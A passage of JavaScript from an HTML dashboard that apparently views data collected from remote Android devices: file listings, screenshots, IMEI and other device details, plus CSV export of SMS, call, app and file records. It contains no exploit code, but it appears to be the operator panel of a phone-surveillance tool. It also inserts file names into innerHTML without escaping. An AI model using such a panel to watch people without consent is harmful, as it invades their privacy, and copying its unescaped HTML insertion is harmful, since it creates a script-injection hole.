                            if (file.type.startsWith('image')) iconClass = 'fa-file-image';
                            else if (file.type === 'pdf') iconClass = 'fa-file-pdf';
                            else if (file.type.startsWith('audio')) iconClass = 'fa-file-audio';
                            else if (file.type.startsWith('video')) iconClass = 'fa-file-video';
                            else if (file.type === 'archive' || file.type === 'zip') iconClass = 'fa-file-archive';
                        }

                        fileItem.innerHTML = `
                            <div>
                                <i class="fas ${iconClass} fa-fw file-icon"></i>
                                <span>${file.name || 'N/A'}</span>
                                <small class="d-block text-muted">${file.path || 'N/A'} - ${file.size || 'N/A'}</small>
                            </div>
                            ${file.url ? `<a href="${file.url}" target="_blank" class="btn btn-sm btn-outline-primary"><i class="fas fa-download"></i></a>` : ''}
                        `;
                        filesListEl.appendChild(fileItem);
                        filesExportData.push({Name: file.name, Path: file.path, Size: file.size, Type: file.type, URL: file.url || '' });
                    });
                } else {
                    noDataMsg.classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading files:", error);
                noDataMsg.classList.remove('d-none').textContent = `Error loading data: ${error.message}`;
            });
        }
        
        function loadScreenshots(deviceId) {
            const screenshotsRef = ref(db, `devices/${deviceId}/screenshots`);
            const galleryEl = document.getElementById('screenshots-gallery');
            const noDataMsg = document.getElementById('no-screenshots-message');
            galleryEl.innerHTML = '';

            activeDataListenerUnsubscribe = onValue(screenshotsRef, (snapshot) => {
                const screenshots = snapshot.val();
                galleryEl.innerHTML = '';
                if (screenshots && Object.keys(screenshots).length > 0) {
                    noDataMsg.classList.add('d-none');
                    Object.values(screenshots).forEach(ss => {
                        const imgContainer = document.createElement('div');
                        imgContainer.classList.add('m-1');
                        const img = document.createElement('img');
                        img.src = ss.url || 'https://via.placeholder.com/150?text=No+Preview';
                        img.alt = ss.name || 'Screenshot';
                        img.classList.add('img-thumbnail', 'screenshot-img');
                        img.title = `${ss.name || 'Screenshot'}\nTimestamp: ${ss.timestamp ? new Date(ss.timestamp).toLocaleString() : 'N/A'}`;
                        
                        // Optional: Lightbox functionality could be added here
                        img.onclick = () => window.open(ss.url, '_blank'); // Simple open in new tab

                        imgContainer.appendChild(img);
                        galleryEl.appendChild(imgContainer);
                    });
                } else {
                    noDataMsg.classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading screenshots:", error);
                noDataMsg.classList.remove('d-none').textContent = `Error loading data: ${error.message}`;
            });
        }
        
        function loadDeviceInfo(deviceId) {
            const infoRef = ref(db, `devices/${deviceId}/info`);
            const noDataMsg = document.getElementById('no-deviceinfo-message');
            activeDataListenerUnsubscribe = onValue(infoRef, (snapshot) => {
                const data = snapshot.val();
                 document.getElementById('device-info-card').classList.add('d-none'); // Hide by default
                if (data) {
                    noDataMsg.classList.add('d-none');
                    document.getElementById('info-model').textContent = `Model: ${data.model || 'N/A'}`;
                    document.getElementById('info-manufacturer').textContent = `Manufacturer: ${data.manufacturer || 'N/A'}`;
                    document.getElementById('info-android-version').textContent = `Android Version: ${data.android_version || 'N/A'}`;
                    document.getElementById('info-imei').textContent = `IMEI: ${data.imei || 'N/A'}`;
                    // Add more fields as they exist in your DB structure
                    document.getElementById('device-info-card').classList.remove('d-none');
                } else {
                    noDataMsg.classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading device info:", error);
                noDataMsg.classList.remove('d-none').textContent = `Error loading data: ${error.message}`;
            });
        }
        
        // --- UTILITY FUNCTIONS ---
        function formatTimeAgo(timestamp) {
            if (!timestamp) return 'N/A';
            const now = new Date();
            const secondsPast = (now.getTime() - new Date(timestamp).getTime()) / 1000;

            if (secondsPast < 60) return `${Math.round(secondsPast)}s ago`;
            if (secondsPast < 3600) return `${Math.round(secondsPast / 60)}m ago`;
            if (secondsPast <= 86400) return `${Math.round(secondsPast / 3600)}h ago`;
            
            const daysPast = Math.round(secondsPast / 86400);
            if (daysPast < 7) return `${daysPast}d ago`;
            
            return new Date(timestamp).toLocaleDateString();
        }

        function exportToCsv(filename, rows) {
            if (!rows || rows.length === 0) {
                alert("No data available to export.");
                return;
            }
            // Ensure all rows are objects, if not, try to make them
            const processedRows = rows.map(row => typeof row === 'object' && row !== null ? row : { data: row });

            const header = Object.keys(processedRows[0]).join(',');
            const csvContent = processedRows.map(rowObject => {
                return Object.values(rowObject).map(value => {
                    let strValue = String(value === null || typeof value === 'undefined' ? '' : value);
                    // Escape double quotes and wrap in double quotes if it contains comma, newline or double quote
                    if (strValue.includes(',') || strValue.includes('\n') || strValue.includes('"')) {
                        strValue = `"${strValue.replace(/"/g, '""')}"`;
                    }
                    return strValue;
                }).join(',');
            }).join('\n');

            const blob = new Blob([header + '\n' + csvContent], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement("a");
            if (link.download !== undefined) {
                const url = URL.createObjectURL(blob);
                link.setAttribute("href", url);
                link.setAttribute("download", filename);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
            }
        }
        
        document.querySelectorAll('.export-btn').forEach(button => {
            button.addEventListener('click', (e) => {
                if (!currentDeviceUID) {
                    alert("Please select a device first.");
                    return;
                }
                const type = e.target.dataset.type;
                let dataToExport = [];
                let filename = `${currentDeviceAlias || 'device'}_${type}_export.csv`;

                switch(type) {
                    case 'sms': dataToExport = smsExportData; break;
                    case 'calls': dataToExport = callsExportData; break;
                    case 'apps': dataToExport = appsExportData; break;
                    case 'files': dataToExport = filesExportData; break;
                    // Add other types if needed
                    default:
                        alert("Export not configured for this type.");
                        return;
                }
                exportToCsv(filename, dataToExport);
            });
        });

    </script>
</body>
</html>